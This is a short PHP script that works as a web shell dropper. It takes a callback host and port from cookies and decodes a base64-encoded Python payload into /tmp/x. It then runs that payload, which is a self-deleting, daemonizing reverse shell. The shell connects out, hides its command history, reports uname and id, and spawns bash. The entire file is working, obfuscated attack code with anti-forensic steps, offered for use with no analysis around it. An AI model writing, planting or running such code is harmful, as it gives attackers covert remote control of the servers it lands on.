<?php
$cbhost = $_COOKIE['host'];
$cbport = $_COOKIE['port'];
echo "{+} Using ".$cbhost.":".$cbport." as callback...\n{+} Dropping shell...\n";
$shell = "IyEvdXNyL2Jpbi9weXRob24yCiMgY29kaW5nOiB1dGYtOAojIFNlbGYgRGVzdHJ1Y3RpbmcsIERhZW1vbmluZyBSZXZlcnNlIFBUWS4KIyBybSdzIHNlbGYgb24gcXVpdCA6MwojIFRPRE86CiMgMTogQWRkIGNyeXB0bwojIDI6IEFkZCBwcm9jbmFtZSBzcG9vZgppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgcHR5CmltcG9ydCBzb2NrZXQKaW1wb3J0IGNvbW1hbmRzCgpzaGVsbG1zZyA9ICJceDFiWzBtXHgxYlsxOzM2bUdvdCByb290IHlldD9ceDFiWzBtXHJcbiIgIyBuZWVkeiBhc2NpaQoKZGVmIHF1aXR0ZXIobXNnKToKICAgIHByaW50IG1zZwogICAgb3MudW5saW5rKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpICMgdW5jb21tZW50IGZvciBnb2dvc2VsZmRlc3RydWN0CiAgICBzeXMuZXhpdCgwKQoKZGVmIHJldmVyc2UoY2Job3N0LCBjYnBvcnQpOgogICAgdHJ5OgogICAgICAgIHVuYW1lID0gY29tbWFuZHMuZ2V0b3V0cHV0KCJ1bmFtZSAtYSIpCiAgICAgICAgaWQgPSBjb21tYW5kcy5nZXRvdXRwdXQoImlkIikKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcXVpdHRlcignZ3JhYiB1bmFtZS9pZCBmYWlsJykKICAgIHRyeToKICAgICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHNvY2suY29ubmVjdCgoY2Job3N0LCBpbnQoY2Jwb3J0KSkpCiAgICBleGNlcHQ6CiAgICAgICAgcXVpdHRlcignYWJvcnQ6IGNvbm5lY3Rpb24gZmFpbCcpCiAgICB0cnk6CiAgICAgICAgb3MuZHVwMihzb2NrLmZpbGVubygpLCAwKQogICAgICAgIG9zLmR1cDIoc29jay5maWxlbm8oKSwgMSkKICAgICAgICBvcy5kdXAyKHNvY2suZmlsZW5vKCksIDIpCiAgICBleGNlcHQ6CiAgICAgICAgcXVpdHRlcignYWJvcnQ6IGR1cDIgZmFpbCcpCiAgICB0cnk6CiAgICAgICAgb3MucHV0ZW52KCJISVNURklMRSIsICIvZGV2L251bGwiKQogICAgICAgIG9zLnB1dGVudigiUEFUSCIsICcvdXNyL2xvY2FsL3NiaW46L3Vzci9zYmluOi9zYmluOi9iaW46L3Vzci9sb2NhbC9iaW46L3Vzci9iaW4nKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBxdWl0dGVyKCdhYm9ydDogcHV0ZW52IGZhaWwnKQogICAgdHJ5OgogICAgICAgIHNvY2suc2VuZChzaGVsbG1zZykKICAgICAgICBzb2NrLnNlbmQoJ1x4MWJbMTszMm0nK3VuYW1lKyJcclxuIitpZCsiXHgxYlswbVxyXG4iKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBxdWl0dGVyKCdzZW5kIGlkL3VuYW1lIGZ1Y2t1cCcpCiAgICB0cnk6CiAgICAgICAgcHR5LnNwYXduKCcvYmluL2Jhc2gnKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBxdWl0dGVyKCdhYm9ydDogcHR5IHNwYXduIGZhaWwnKQogICAgcXVpdHRlcigncXVpdHRpbmcsIGNsZWFudXAnKQoKZGVmIG1haW4oYXJncyk6CiAgICBpZiBvcy5mb3JrKCkgPiAwOiAKICAgICAgICBvcy5fZXhpdCgwKQogICAgcmV2ZXJzZShzeXMuYXJndlsxXSwgc3lzLmFyZ3ZbMl0pCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbihzeXMuYXJndikK";
$x = fopen("/tmp/x", "w+");
fwrite($x, base64_decode($shell));
fclose($x);
echo "{+} Shell dropped... Triggering...\n";
system("python /tmp/x ".$cbhost." ".$cbport);
die('{+} got shell?'); // payload should have rm'd itself
?>
